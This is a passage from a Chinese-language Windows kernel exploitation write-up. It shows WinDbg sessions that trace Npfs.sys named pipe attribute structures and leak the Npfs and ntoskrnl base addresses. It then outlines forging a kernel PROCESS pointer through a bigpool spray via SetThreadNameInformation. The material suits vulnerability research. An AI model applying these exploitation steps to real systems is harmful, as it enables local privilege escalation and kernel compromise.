
``` 
Breakpoint 2 hit
Npfs!NpSetAttributeInList:
fffff806`2f2b5434 48895c2408 mov qword ptr [rsp+8],rbx
1: kd> r
////pipe\_attribute->list.Flink指向一个正常的pipe\_attribute结构体rcx=ffffad09df8c7ad0
rax=00000000000001d6 rbx=ffffad09df8c79d0 rcx=ffffad09df8c7ad0
rdx=0000000000000000 rsi=ffffbe0780f7e620 rdi=0000000000000002
rip=fffff8062f2b5434 rsp=ffffa601e671c5a8 rbp=ffffad09df8c7ad0
r8=ffffbe0780f7e620 r9=ffffbe0780f7e622 r10=fffff806292609e0
r11=0000000000000000 r12=ffffbe077eb3dd70 r13=ffffbe07933bb320
r14=ffffad09db8d3900 r15=ffffbe0780f7e622
iopl=0 nv up ei pl zr na po nc
cs=0010 ss=0018 ds=002b es=002b fs=0053 gs=002b efl=00040246
Npfs!NpSetAttributeInList:
fffff806`2f2b5434 48895c2408 mov qword ptr [rsp+8],rbx ss:0018:ffffa601`e671c5b0=ffffad09df8c79d0
//查看当前线程信息
1: kd> !thread
THREAD ffffbe0786ec70c0 Cid 0bf4.14ac Teb: 0000000aef327000 Win32Thread: 0000000000000000 RUNNING on processor 1
IRP List:
//irp在这里
ffffbe077eb3dd70: (0006,0160) Flags: 00060870 Mdl: 00000000
Not impersonating
DeviceMap ffffad09dbe81290
Owning Process ffffbe07872d0080 Image: poolfs.exe
Attached Process N/A Image: N/A
Wait Start TickCount 12031 Ticks: 6468 (0:00:01:41.062)
Context Switch Count 147 IdealProcessor: 1
UserTime 00:00:00.000
KernelTime 00:00:00.062
Win32 Start Address 0x00007ff644b3b3af
Stack Init ffffa601e671cc90 Current ffffa601e671c6a0
Base ffffa601e671d000 Limit ffffa601e6717000 Call 0000000000000000
Priority 8 BasePriority 8 PriorityDecrement 0 IoPriority 2 PagePriority 5
Child-SP RetAddr : Args to Child : Call Site
ffffa601`e671c5a8 fffff806`2f2b53d5 : ffffad09`df8c79d0 00000000`00000001 ffffa601`00000000 ffffbe07`80f7e620 : Npfs!NpSetAttributeInList
ffffa601`e671c5b0 fffff806`2f2b0f66 : ffffad09`db8d3900 ffffbe07`7e6e58f0 00000000`000001d6 00000000`00000000 : Npfs!NpSetAttribute+0x231
ffffa601`e671c620 fffff806`2f2ac847 : ffffbe07`7e6e58f0 00000000`00000000 00000000`00000000 ffffbe07`7eb3de88 : Npfs!NpCommonFileSystemControl+0x46d6
ffffa601`e671c6c0 fffff806`29252f55 : ffffbe07`874d1dc0 fffff806`27714b46 ffffa601`e671d000 ffffa601`e6717000 : Npfs!NpFsdFileSystemControl+0x27
ffffa601`e671c6f0 fffff806`27716ccf : ffffbe07`7e08eda0 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IofCallDriver+0x55
ffffa601`e671c730 fffff806`2774caf4 : ffffa601`e671c7c0 00000000`00000000 00000000`000000c8 fffff806`2962b3c1 : FLTMGR!FltpLegacyProcessingAfterPreCallbacksCompleted+0x28f
ffffa601`e671c7a0 fffff806`29252f55 : 00000000`0000000a ffffbe07`7eb3dd70 00000000`00000002 00000000`00000001 : FLTMGR!FltpFsControl+0x104
ffffa601`e671c800 fffff806`295fd878 : ffffa601`e671cb80 ffffbe07`7eb3dd70 00000000`00000001 ffffbe07`872d0080 : nt!IofCallDriver+0x55
ffffa601`e671c840 fffff806`295fd145 : 00000000`0011003c ffffa601`e671cb80 00000000`00000005 ffffa601`e671cb80 : nt!IopSynchronousServiceTail+0x1a8
ffffa601`e671c8e0 fffff806`296c2666 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0x5e5
ffffa601`e671ca20 fffff806`294074b5 : 00000000`00008354 fffff806`2970900e 00000000`00000000 ffffbe07`876e7080 : nt!NtFsControlFile+0x56
ffffa601`e671ca90 00007ffb`a470cd44 : 00007ff6`44b42606 00007ff6`44c82048 00000000`00000000 0000000a`ef4fdb00 : nt!KiSystemServiceCopyEnd+0x25 (TrapFrame @ ffffa601`e671cb00)
0000000a`ef4fdaa8 00007ff6`44b42606 : 00007ff6`44c82048 00000000`00000000 0000000a`ef4fdb00 00000145`2f290000 : ntdll!NtFsControlFile+0x14
//查看当前irp
1: kd> !irp ffffbe077eb3dd70
Irp is active with 2 stacks 1 is current (= 0xffffbe077eb3de40)
No Mdl: System buffer=ffffbe0780f7e620: Thread ffffbe0786ec70c0: Irp stack trace.
cmd flg cl Device File Completion-Context
>[IRP\_MJ\_FILE\_SYSTEM\_CONTROL(d), N/A(0)]
//file\_object默认第一个ffffbe07933bb320
4 e0 ffffbe077e6e58f0 ffffbe07933bb320 fffff806277143b0-ffffbe07874d1dc0 Success Error Cancel
\FileSystem\Npfs FLTMGR!FltpPassThroughCompletion
Args: 00000100 000001d8 0011003c 00000000
[IRP\_MJ\_FILE\_SYSTEM\_CONTROL(d), N/A(0)]
4 1 ffffbe077eb95850 ffffbe07933bb320 00000000-00000000 pending
\FileSystem\FltMgr
Args: 00000100 000001d8 0011003c 00000000
1: kd> dt nt!\_file\_object ffffbe07933bb320
+0x000 Type : 0n5
+0x002 Size : 0n216
+0x008 DeviceObject : 0xffffbe07`7e6e58f0 \_DEVICE\_OBJECT
+0x010 Vpb : (null)
+0x018 FsContext : 0xffffad09`db8d3900 Void
+0x020 FsContext2 : 0xffffad09`df8c7991 Void
+0x028 SectionObjectPointer : (null)
....
kd> ?rcx - 0xffffad09`df8c7990=140 ;也就是ffffad09`df8c7ad0 - 0xffffad09`df8c7990 = 140 = ROOT\_PIPE\_ATTRIBUTE\_OFFSET
Evaluate expression: 320 = 00000000`00000140
1: kd> dq 0xffffad09`df8c7990
ffffad09`df8c7990 00000002`00000204 0000000c`00000003
ffffad09`df8c79a0 00000101`00000002 ffffad09`db8d3a08
ffffad09`df8c79b0 ffffad09`db8d3a08 ffffad09`db8d3900
//0xffffad09`df8c7990+FILE\_OBJECT\_OFFSET指向file\_object:=>ffffbe07`933bb320
ffffad09`df8c79c0 ffffbe07`933bb320 ffffbe07`933ba1f0
ffffad09`df8c79d0 00000000`00000001 ffffbe07`86bdf000
ffffad09`df8c79e0 ffffbe07`86bdf000 00001440`00000001
ffffad09`df8c79f0 00010000`00000001 00000000`00001440
ffffad09`df8c7a00 ffffad09`df8c7a09 00000000`00000000
```

可见 `xploit->leak_root_attribute -ROOT_PIPE_ATTRIBUTE_OFFSET+FILE_OBJECT_OFFSET` 处存放的就是当前 `file_object` 指针,顺着这个思路可以得到 `NpFsdCreate`

```
1: kd> dx -id 0,0,ffffbe07872d0080 -r1 ((ntkrnlmp!\_DEVICE\_OBJECT \*)0xffffbe077e6e58f0)
((ntkrnlmp!\_DEVICE\_OBJECT \*)0xffffbe077e6e58f0) : 0xffffbe077e6e58f0 : Device for "\FileSystem\Npfs" [Type: \_DEVICE\_OBJECT \*]
[<Raw View>] [Type: \_DEVICE\_OBJECT]
Flags : 0x240
UpperDevices : Immediately above is Device for "\FileSystem\FltMgr" [at 0xffffbe077eb95850]
LowerDevices : None
Driver : 0xffffbe077e93fe00 : Driver "\FileSystem\Npfs" [Type: \_DRIVER\_OBJECT \*]
//这里就是驱动对象的主分发函数
1: kd> dqs 0xffffbe077e93fe00+70
ffffbe07`7e93fe70 fffff806`2f2ab540 Npfs!NpFsdCreate
ffffbe07`7e93fe78 fffff806`2f2ab140 Npfs!NpFsdCreateNamedPipe
1: kd> ?Npfs!NpFsdCreate-Npfs
Evaluate expression: 46400 = 00000000`0000b540
1: kd> ?Npfs!\_imp\_ExAllocatePoolWithTag-Npfs
Evaluate expression: 28752 = 00000000`00007050
1: kd> dqs fffff806`2f2a7050=Npfs!\_imp\_ExAllocatePoolWithTag
fffff806`2f2a7050 fffff806`299b1030 nt!ExAllocatePoolWithTag
fffff806`2f2a7058 fffff806`299b1010 nt!ExFreePool
1: kd> ?nt!ExAllocatePoolWithTag- nt
Evaluate expression: 10162224 = 00000000`009b1030
```

通过 `Npfs!NpFsdCreate` 计算出 `NpFs.sys` 模块的基址,获取 `Npfs!_imp_ExAllocatePoolWithTag` 的内部实现(具体可以参考PE导入表结构)指向 `nt!ExAllocatePoolWithTag` 指针,减去他的偏移最后就得到了 `nt` 模块的基址,笔者同时增加了另一种方式验证,加强程序的稳定性,获得这个基址的方法具体参考工具源码.

## 漏洞利用

伪造一个内核态 `PROCESS` 结构体指针,除了通过 `pipe_attribute` 结构体占位和获取 `leak_root_queue` 相对偏移量得到它的实际指针地址之外,还可以通过一种叫 `bigpool` 的技术实现,这种技术可以分配任意大小的非分页内存可控数据并获得申请的地址,通过 `nt` 模块的内部调用 `SetThreadNameInformation` 实现,参数为一个 `UNICODE_STRING` 结构体,笔者已经将这种技术集成进了工具
